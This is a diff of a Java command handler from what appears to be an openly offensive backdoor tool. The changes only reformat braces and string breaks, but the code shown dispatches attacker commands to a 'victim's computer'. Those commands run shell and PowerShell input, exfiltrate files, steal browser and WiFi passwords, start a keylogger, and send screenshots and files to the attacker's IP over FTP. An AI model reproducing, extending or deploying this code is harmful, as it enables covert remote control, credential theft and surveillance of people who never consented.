@@ -25,8 +25,10 @@ public class HandleCommand {
 	public static void handle(String command) {
 		String send="";
 		if(command.equals("help"))
-			send="[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"+"[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
-					+"[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"+"[keylog] Start a KeyLogger on victim's computer\n[ss] Get screenshot of vitim's computer";
+			send="[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
+				+"[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
+				+"[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
+				+"[keylog] Start a KeyLogger on victim's computer\n[ss] Get screenshot of vitim's computer";
 		else if(command.startsWith("cmd"))
 			send=Utils.runCommand(command.substring(4));
 		else if(command.startsWith("ps"))
@@ -44,7 +46,7 @@ public class HandleCommand {
 				send="Files exfiltrated to '"+System.getProperty("user.dir")+"\\gathered\\ExfiltedFiles' on victim's computer";
 			else
 				send="An error occurred when trying to exfiltrate files";
-		else if(command.equals("expass")) {
+		else if(command.equals("expass")){
 			if(Exfil.exfilBroserCreds())
 				send+="Microsoft Edge and Internet Explorer passwords exfiltrated to '"+System.getProperty("user.dir")+"\\gathered\\BrowserPasswords.txt' on vitim's computer\n";
 			else
@@ -53,23 +55,23 @@ public class HandleCommand {
 				send+="WiFi passwords exfiltrated to '"+System.getProperty("user.dir")+"\\gathered\\WiFiPasswords.txt' on victim's computer";
 			else
 				send+="An error occurred when trying to exfiltrate WiFi passwords";
-		}else if(command.startsWith("filesend")) {
-			try {
+		}else if(command.startsWith("filesend")){
+			try{
 				Thread.sleep(2000);
-			}catch (InterruptedException e) {}
+			}catch(InterruptedException e){}
 			if(FTP.backdoor(command.substring(9), "rec", Backdoor.ip))
 				send="File sent";
 			else
 				send="An error occurred when trying to send file";
-		}else if(command.startsWith("filerec")) {
-			try {
+		}else if(command.startsWith("filerec")){
+			try{
 				Thread.sleep(2000);
-			}catch (InterruptedException e) {}
+			}catch(InterruptedException e){}
 			if(FTP.backdoor(command.substring(8), "send", Backdoor.ip))
 				send="File received";
 			else
 				send="An error occurred when trying to receive file";
-		}else if(command.equals("keylog")) {
+		}else if(command.equals("keylog")){
 			Thread keyLogger=new Thread() {
 				@Override
 				public void run() {
@@ -79,13 +81,13 @@ public class HandleCommand {
 			keyLogger.start();
 			send="Keys are being logged to '"+System.getProperty("user.dir")+"\\gathered\\keys.log' on victim's computer";
 		}else if(command.equals("ss"))
-			try {
+			try{
 				Thread.sleep(2000);
 				ImageIO.write(new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())), "png", new File("screenshot.png"));
 				FTP.backdoor("screenshot.png", "send", Backdoor.ip);
 				new File("screenshot.png").delete();
 				send="Screenshot received";
-			}catch (Exception e) {
+			}catch(Exception e){
 				send="An error occurred when trying to receive screenshot";
 			}
 		else if(!command.isEmpty())
